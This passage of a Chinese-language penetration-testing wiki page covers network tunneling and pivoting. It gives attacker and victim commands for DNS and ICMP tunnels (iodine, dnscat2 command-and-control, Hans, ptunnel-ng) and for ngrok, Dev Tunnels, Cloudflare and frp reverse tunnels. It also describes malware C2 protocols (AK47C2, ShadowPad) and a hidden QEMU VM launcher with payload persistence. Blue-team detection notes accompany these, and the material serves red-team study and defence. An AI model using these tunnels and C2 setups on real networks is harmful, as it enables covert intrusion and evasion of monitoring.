Iodine 通过 DNS 查询创建 IPv4 隧道，并使用 TUN 接口；其文档所述的配置要求两端都具备创建这些接口所需的权限。<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS 传输的开销高于直接使用 TCP，通常速度较慢；你可以通过此隧道建立压缩的 SSH 连接，方法如下：<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**在此处下载**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 通过 DNS 建立加密的命令与控制通道；以下服务器和客户端命令遵循其文档中的用法。<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端；其 README 介绍了下方所示的 `Start-Dnscat2` 参数。<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding with dnscat**

dnscat2 的交互式 `listen` 命令会将本地监听器映射到远程主机和端口。<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### 更改 proxychains DNS

Proxychains-ng 会 hook 动态链接的 TCP 连接，无法传输 UDP 或 ICMP；DNS 代理可以配置，因此应检查已安装的 `proxychains.conf` 和 resolver helper，而不是假定使用固定的公共 resolver。旧版 `proxyresolv` 脚本提供 `PROXY_DNS_SERVER`，用于选择 resolver；需要解析内部名称时，应使用 pivot 可访问的 resolver。<sup>[[34]](#references)[[35]](#references)</sup>

## Go 中的隧道

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### 自定义 DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor 创建了一种**双通道 C2（“AK47C2”）**，仅滥用出站 **DNS** 和**明文 HTTP POST** 流量——这两种协议在企业网络中很少被阻止。<sup>[[2]](#references)</sup>

1. **DNS 模式 (AK47DNS)**
   • 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。  
   • 在 *任务请求* 前添加 `1`，或在 *结果* 前添加 `2`，然后将不同字段（标志、SessionID、计算机名称）拼接起来。  
   • 每个字段都使用 ASCII 密钥 `VHBD@H` 进行 **XOR 加密**，再进行十六进制编码，并用点号连接——最后附加攻击者控制的域名：

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • 请求使用 `DnsQuery()` 查询 **TXT**（并在回退时查询 **MG**）记录。  
   • 当响应超过 0xFF 字节时，后门会将数据**分片**为 63 字节的片段，并插入标记：
     `s<SessionID>t<TOTAL>p<POS>`，以便 C2 服务器重新排序。

2. **HTTP 模式（AK47HTTP）**
   • 构建一个 JSON 封装：
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • 整个数据块经过 XOR-`VHBD@H` → hex 编码，然后作为正文发送到 **`POST /`**，并带有 `Content-Type: text/plain` 头。
   • 回复采用相同的编码方式，`cmd` 字段会执行 `cmd.exe /c <command> 2>&1`。

Blue Team notes
• 留意异常的 **TXT queries**：其第一个标签是长十六进制字符串，并且始终以同一个罕见域名结尾。
• 恒定的 XOR key 后接 ASCII-hex 很容易通过 YARA 检测：`6?56484244?484`（`VHBD@H` 的十六进制表示）。
• 对于 HTTP，标记正文为纯 hex 且长度为偶数的 `text/plain` POST 请求。

{{#note}}
该通道会将每个子域标签的长度限制在 63 个八位字节以内，但符合协议规范并不意味着具有隐蔽性；罕见域名、较长的十六进制标签和查询量仍然是检测信号。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans 介绍了一种使用 TUN 设备和 ICMP echo requests 的 IPv4-over-ICMP 隧道；搭建时需要具备创建接口所需的权限。<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**在此下载**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng 通过 ICMP 传输 TCP 连接，并使用下方所示的 `-p`、`-l`、`-r` 和 `-R` 选项分别指定 proxy、本地 listener、目标主机和目标端口。<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) 是一款通过安全隧道将本地网络服务发布到线上环境的代理；其 CLI 文档介绍了 HTTP、TCP 和文件 URL 端点，且打印出的端点主机名可能因端点和账户而异。<sup>[[39]](#references)</sup>

### 安装

- 创建账户：https://ngrok.com/signup
- 客户端下载：

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_需要时，agent 也支持身份验证和 TLS 选项。<sup>[[39]](#references)</sup>_

#### TCP 隧道

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### 通过 HTTP 暴露文件

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### 嗅探 HTTP 请求

_适用于 XSS、SSRF、SSTI 等场景_\
独立 agent 默认在 `http://127.0.0.1:4040` 提供 HTTP 流量检查接口。<sup>[[40]](#references)</sup>

#### 隧道连接内部 HTTP 服务

`--host-header=rewrite` 选项会将上游 HTTP `Host` 标头改写为与本地服务匹配。<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml 简单配置示例

此配置使用 ngrok Agent Config v2；命名隧道使用 `proto` 和 `addr`，并通过 `ngrok start` 启动。<sup>[[42]](#references)</sup> 它会打开 3 条隧道：

- 2 条 TCP 隧道
- 1 条 HTTP 隧道，从 /tmp/httpbin/ 提供静态文件_CONTENT

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels 可以通过 Microsoft 中继基础设施发布本地 TCP 服务。主机 CLI 会创建出站隧道，而 `devtunnel connect` 会在客户端重新创建托管端口；默认情况下，隧道需要身份验证，除非主动放宽访问控制。<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

这可以通过 `*.devtunnels.ms` 暴露 RDP，而无需在边界上开放新的入站监听器。它还可以与 `rdp2tcp` 等 RDP 虚拟通道隧道结合使用，将 RDP 会话变成用于任意 TCP 流量的第二阶段 pivot。<sup>[[58]](#references)</sup>

进行威胁狩猎时，将 Dev Tunnels CLI 的执行与发往 `*.devtunnels.ms` 的 DNS/TLS 流量以及异常的 RDP 虚拟通道事件进行关联。经过身份验证的隧道并不会仅仅因为使用了 Microsoft 所有的中继服务就变得无害。<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel 的 `cloudflared` connector 会建立出站连接；发布的应用可以路由 HTTP、HTTPS、TCP、SSH 和 RDP 流量，而 quick tunnel 适用于 HTTP 开发。<sup>[[43]](#references)[[45]](#references)</sup>

### 快速隧道单行命令

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 源站（旧版模式）

旧版 `--socks5` 标志告知 `cloudflared` 本地源站使用 SOCKS5；它不会创建本地 SOCKS5 监听器。对于托管隧道，`originRequest.proxyType: socks` 用于配置 SOCKS5 源站处理。<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### 使用 DNS 建立持久隧道

本地管理的 tunnel 配置使用小写的 `tunnel`、`credentials-file` 和 `url` 键，如下所示。<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

启动连接器：

```bash
cloudflared tunnel run mytunnel
```

连接器会建立出站连接，默认先协商 QUIC，失败时回退到 HTTP/2；不要假设每种部署都使用 TCP/443。运行时仅使用部署所需的权限。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个 Go 反向代理，支持 **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX 和 XTCP**。XTCP 使用 P2P 打洞，其成功与否取决于 NAT。从 **v0.53.0** 开始，它可以充当 **SSH Tunnel Gateway**，因此目标主机无需 `frpc` 二进制文件，即可使用标准 OpenSSH 客户端。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 经典反向 TCP 隧道

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 使用新的 SSH 网关（无需 frpc 二进制文件）

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

上述命令使用标准 OpenSSH 客户端，将受害者的端口 **8080** 映射为 **attacker_ip:9000**，由 `frps` 提供网关。<sup>[[50]](#references)</sup>

## STUN 辅助的 UDP 回连

从 UDP socket 发送的 STUN Binding 请求可以暴露其服务器反射 IP 地址和端口，而定期发送流量可以保持 NAT 映射有效。公共 STUN 服务器并不是任意控制数据包的中继。<sup>[[60]](#references)</sup> 一种经过分析的回连设计会让同一个 UDP socket 发送一条短控制数据报，然后在收到触发信号后，通过*单独的出站 TCP 连接*获取并执行命令。<sup>[[59]](#references)</sup>

要接收控制端发送的 UDP 数据包，设计仍需将映射信息告知控制端，并满足 NAT 的过滤策略。依赖地址或端口的过滤可能接受来自 STUN 服务器的响应，却丢弃来自其他端点的数据包。<sup>[[60]](#references)[[61]](#references)</sup> 经过分析的后门其 rendezvous 路径未经验证，因此仅凭成功收到 STUN 响应，并不能证明其控制通道可达。<sup>[[59]](#references)</sup> 有关具备明确 rendezvous 机制和中继回退方案的独立协议，请参阅 [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport)。

## 使用 QEMU 的隐蔽 VM 隧道

QEMU 用户模式网络无需 root 或管理员权限即可创建虚拟网络；`-netdev user,hostfwd=...` 可将来自主机的 TCP、UDP 或 UNIX 连接转发到 guest。<sup>[[51]](#references)</sup> TrustedSec 记录了一起事件，其中使用了 Tiny Core QEMU VM 并尝试建立反向 SSH 隧道；在这种情况下，面向主机的 EDR 可能会漏掉 guest 内的活动。<sup>[[1]](#references)</sup>

### 快速单行命令

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 上述命令会启动一个 **Tiny Core Linux** 虚拟机，分配 256 MiB 虚拟机内存，并使用 qcow2 磁盘映像；该磁盘映像并非内存盘。
• Windows 主机上的 **2222/tcp** 端口会透明转发到虚拟机内的 **22/tcp** 端口。  
• 从攻击者的角度看，目标只开放了 2222 端口；所有到达该端口的数据包都会由虚拟机中运行的 SSH 服务器处理。

### 通过 VBScript 隐蔽启动

TrustedSec 在上述事件引用的资料中发现了由 VBS 驱动的 QEMU 启动和 Tiny Core 映像。<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

使用 `cscript.exe //B update.vbs` 运行脚本可使窗口保持隐藏。<sup>[[1]](#references)</sup>

### Guest 内持久化

引用的事件描述了如何通过 `/opt/bootlocal.sh` 和 `/opt/filetool.lst` 在无状态 Tiny Core guest 中实现持久化：<sup>[[1]](#references)</sup>

1. 将 payload 放到 `/opt/123.out`  
2. 追加到 `/opt/bootlocal.sh`：

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，这样关机时 payload 会被打包进 `mydata.tgz`。

### Telemetry 注意事项

• 主机仍会暴露 QEMU 进程、qcow2 镜像以及任何由主机转发的监听器。  
• 仅扫描主机进程可能不会检查 guest 进程，但虚拟化并不能保证规避检测；网络、QEMU 和镜像遥测仍可能暴露它。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 提示

• 对用户可写路径中的**非预期 QEMU/VirtualBox/KVM 二进制文件**发出告警。  
• 阻止源自 `qemu-system*.exe` 的出站连接。  
• 搜寻在 QEMU 启动后立即绑定的罕见监听端口（2222、10022、……）。

## 通过 `HttpAddUrl` 实现 IIS/HTTP.sys 中继节点（ShadowPad）

Check Point 描述了 ShadowPad 的 IIS 模块如何通过 `HttpAddUrl` 绑定 URL 前缀，将已攻陷的边界 Web 服务器变成后门和中继节点。<sup>[[3]](#references)</sup>

同一份报告还详细介绍了默认值、通配符监听器、数据包解密、中继队列和调试遥测，概述如下。<sup>[[3]](#references)</sup>

* **配置默认值** – 如果模块的 JSON 配置省略了某些值，它会回退到看似合理的 IIS 默认值（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）。这样，IIS 就会以正确的品牌标识响应正常流量。
* **通配符拦截** – 操作者提供以分号分隔的 URL 前缀列表（主机和路径中均可使用通配符）。模块会为每个条目调用 `HttpAddUrl`，使 HTTP.sys 将匹配的请求路由到恶意处理程序；不匹配的请求则回退到 IIS 的正常行为。
* **加密的第一个数据包** – 请求正文的前两个字节携带一个自定义 32 位 PRNG 的种子。协议解析前，后续每个字节都会与生成的密钥流进行 XOR：

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay 编排** – 该模块维护两个列表：“servers”（上游节点）和“clients”（下游 implants）。如果约 30 秒内未收到 heartbeat，就会清理对应条目。当两个列表都不为空时，它会将第一个正常运行的 server 与第一个正常运行的 client 配对，并在它们的 socket 之间直接转发字节，直到任一端关闭连接。
* **Debug 遥测** – 可选的日志记录每组配对的源 IP、目标 IP 和转发的总字节数。调查人员利用这些线索重建了横跨多个受害者的 ShadowPad mesh。

---

## 其他待检查的工具

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [藏身于阴影之中：通过 QEMU 虚拟化建立隐蔽隧道](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 之前：探索 Storm-2603 之前的勒索软件行动](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – 深入 Ink Dragon：揭示隐秘攻击行动的中继网络与内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap 参考指南：绕过防火墙/IDS 限制](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh 手册](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config 手册](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 发行说明](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：在 Metasploit 中进行 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy 模块文档](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute 模块文档](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng 快速入门](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat 手册](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink 手册](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY 命令行选项](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy 命令](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier 文档](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 手册](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：域名 - 实现与规范](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web 检查界面](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok 虚拟主机](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel 概述](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel 源站参数](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel 设置](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel 配置文件](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel 运行参数](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp 概念](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU 网络文档](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale 源代码仓库](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：通过 BOF-PE 构建由 CDN 前置的 Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI 命令](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT：GhostContainer 与隧道技术](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux 后门滥用公共 STUN 基础设施](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT 会话穿越工具（STUN）](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - 单播 UDP 的 NAT 行为要求](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malware 使用 Tailscale 的 tailcat 规避网络检测](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
